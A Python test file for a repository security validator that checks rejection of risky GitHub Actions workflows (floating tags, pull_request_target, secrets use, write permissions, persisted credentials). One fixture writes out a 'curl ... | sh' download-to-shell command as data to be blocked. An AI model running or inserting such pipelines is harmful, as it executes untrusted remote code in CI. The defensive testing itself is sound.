"""Focused fixtures for the repository security policy validator."""

from __future__ import annotations

import validate_repository_security as policy


def require(condition: bool, message: str) -> None:
    if not condition:
        raise AssertionError(message)


def main() -> int:
    fixtures = 0
    try:
        valid_workflow = """on:
  pull_request:
permissions:
  contents: read
jobs:
  check:
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          persist-credentials: false
"""
        require(not policy.validate_workflow_text(valid_workflow, "valid.yml"), "valid pinned read-only workflow was rejected")
        fixtures += 1

        floating_action = valid_workflow.replace("@3d3c42e5aac5ba805825da76410c181273ba90b1", "@v7")
        require(
            any("full commit SHA" in error for error in policy.validate_workflow_text(floating_action, "floating.yml")),
            "floating Action tag was accepted",
        )
        fixtures += 1

        target_event = valid_workflow.replace("pull_request:", "pull_request_target:")
        require(
            any("pull_request_target" in error for error in policy.validate_workflow_text(target_event, "target.yml")),
            "pull_request_target was accepted",
        )
        fixtures += 1

        secret_context = valid_workflow + "      - run: echo ${{ secrets.EXAMPLE }}\n"
        require(
            any("secrets context" in error for error in policy.validate_workflow_text(secret_context, "secret.yml")),
            "workflow secrets context was accepted",
        )
        fixtures += 1

        unsafe_pipe = valid_workflow + "      - run: curl https://example.invalid/install | sh\n"
        require(
            any("piped directly" in error for error in policy.validate_workflow_text(unsafe_pipe, "pipe.yml")),
            "download-to-shell pipeline was accepted",
        )
        fixtures += 1

        write_permission = valid_workflow.replace("  contents: read", "  contents: write")
        require(
            any("read-only permission" in error or "write-scoped permissions" in error for error in policy.validate_workflow_text(write_permission, "write.yml")),
            "write-scoped pull-request permission was accepted",
        )
        fixtures += 1

        persisted_checkout = valid_workflow.replace("        with:\n          persist-credentials: false\n", "")
        require(
            any("persisted checkout credentials" in error for error in policy.validate_workflow_text(persisted_checkout, "checkout.yml")),
            "persisted checkout credential was accepted",
        )
        fixtures += 1

        synthetic_secret = "sk-" + ("a" * 24)
        require(
            any(pattern.search(synthetic_secret) for pattern in policy.SECRET_PATTERNS),
            "common API-key shape was not recognized",
        )
        fixtures += 1
    except AssertionError as exc:
        print("REPOSITORY_SECURITY_POLICY_TESTS_FAILED")
        print(f"- {exc}")
        return 1
    print(f"REPOSITORY_SECURITY_POLICY_TESTS_OK fixtures={fixtures}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
